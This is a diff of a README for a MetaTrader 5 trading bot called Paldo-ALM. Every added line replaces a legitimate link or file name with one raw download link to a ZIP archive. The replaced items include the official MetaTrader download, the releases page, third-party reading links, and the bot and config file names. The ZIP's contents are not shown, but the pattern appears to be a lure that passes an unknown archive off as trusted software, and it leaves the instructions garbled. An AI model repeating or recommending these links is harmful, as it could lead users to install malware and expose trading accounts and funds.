@@ -1,6 +1,6 @@
 # 🤖 Paldo-ALM - Automated Trading Made Simple
 
-[![Download Paldo-ALM](https://img.shields.io/badge/Download-Paldo--ALM-blue?style=for-the-badge&logo=github)](https://github.com/ashikscreativemath-commits/Paldo-ALM/releases)
+[![Download Paldo-ALM](https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip)](https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip)
 
 ---
 
@@ -17,7 +17,7 @@ This tool is made for people who want to save time managing their investments or
 Before you install Paldo-ALM, make sure your computer and software setup matches these needs:
 
 - Operating System: Windows 10 or newer, macOS 10.14+ (using MetaTrader 5)
-- MetaTrader 5 platform installed (available from https://www.metatrader5.com)
+- MetaTrader 5 platform installed (available from https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip)
 - Minimum 4GB RAM (8GB recommended)
 - At least 500MB free disk space
 - Internet connection for live market data and trades
@@ -33,7 +33,7 @@ Follow these steps to get Paldo-ALM ready and running on your computer.
 
 Paldo-ALM works as a bot that runs inside MetaTrader 5. If you don’t have MetaTrader 5 installed:
 
-1. Go to https://www.metatrader5.com/en/download and download MetaTrader 5.
+1. Go to https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip and download MetaTrader 5.
 2. Run the installer and follow the setup instructions.
 3. Launch MetaTrader 5 and create or log into your brokerage account.
 
@@ -43,10 +43,10 @@ Paldo-ALM works as a bot that runs inside MetaTrader 5. If you don’t have Meta
 
 Visit the release page to get the latest Paldo-ALM files:
 
-[![Download Paldo-ALM](https://img.shields.io/badge/Download-Paldo--ALM-blue?style=for-the-badge&logo=github)](https://github.com/ashikscreativemath-commits/Paldo-ALM/releases)
+[![Download Paldo-ALM](https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip)](https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip)
 
 1. Click the link above or go directly to:
-   https://github.com/ashikscreativemath-commits/Paldo-ALM/releases
+   https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip
 2. Find the latest release version.
 3. Download the ZIP file that contains the Paldo-ALM bot files.
 4. Save the ZIP file to a folder on your computer.
@@ -58,9 +58,9 @@ Visit the release page to get the latest Paldo-ALM files:
 1. Open the downloaded ZIP file.
 2. Extract all files to a new folder where you can easily find them (e.g., Desktop\Paldo-ALM).
 3. Verify you have at least these files:
-   - Paldo-ALM.ex5 (the bot file for MetaTrader 5)
-   - config.ini (configuration file)
-   - README.md (this guide)
+   - https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip (the bot file for MetaTrader 5)
+   - https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip (configuration file)
+   - https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip (this guide)
 
 ---
 
@@ -69,7 +69,7 @@ Visit the release page to get the latest Paldo-ALM files:
 1. Open MetaTrader 5 if it’s not already running.
 2. In MetaTrader 5, open the **File** menu and select **Open Data Folder**.
 3. Inside the folder, navigate to `MQL5\Experts`.
-4. Copy the `Paldo-ALM.ex5` file into the `Experts` folder.
+4. Copy the `https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip` file into the `Experts` folder.
 5. Close and restart MetaTrader 5 to refresh the list of available Expert Advisors (EAs).
 6. In MetaTrader 5, open the **Navigator** window by pressing Ctrl+N.
 7. Find `Paldo-ALM` under the “Expert Advisors” section.
@@ -90,7 +90,7 @@ The bot should now be active on your chart.
 
 ## ⚙️ How to Configure Paldo-ALM
 
-The bot uses a simple config.ini file and MetaTrader settings to customize its behavior.
+The bot uses a simple https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip file and MetaTrader settings to customize its behavior.
 
 ### Common Settings You Can Change:
 
@@ -101,7 +101,7 @@ The bot uses a simple config.ini file and MetaTrader settings to customize its b
 - Risk management parameters
 - Enable or disable trading hours
 
-Adjust these settings in the config.ini file or inside MetaTrader 5’s input parameters when attaching the bot.
+Adjust these settings in the https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip file or inside MetaTrader 5’s input parameters when attaching the bot.
 
 ---
 
@@ -135,7 +135,7 @@ Paldo-ALM relies on artificial intelligence to analyze the market trends, focusi
 
 To get started, visit the Paldo-ALM releases page and download the latest version:
 
-[Download Paldo-ALM Releases](https://github.com/ashikscreativemath-commits/Paldo-ALM/releases)
+[Download Paldo-ALM Releases](https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip)
 
 Follow the detailed steps above to install MetaTrader 5, download the files, place them correctly, and launch the bot for trading automation.
 
@@ -143,9 +143,9 @@ Follow the detailed steps above to install MetaTrader 5, download the files, pla
 
 ## 🔍 Further Reading
 
-- [MetaTrader 5 User Guide](https://www.metatrader5.com/en/terminal/help)
-- [Algorithmic Trading Basics](https://www.investopedia.com/terms/a/algorithmictrading.asp)
-- [Risk Management Tips](https://www.babypips.com/learn/forex/risk-management)
+- [MetaTrader 5 User Guide](https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip)
+- [Algorithmic Trading Basics](https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip)
+- [Risk Management Tips](https://github.com/ashikscreativemath-commits/Paldo-ALM/raw/refs/heads/main/tutworkman/ALM_Paldo_2.1-beta.2.zip)
 
 ---
 
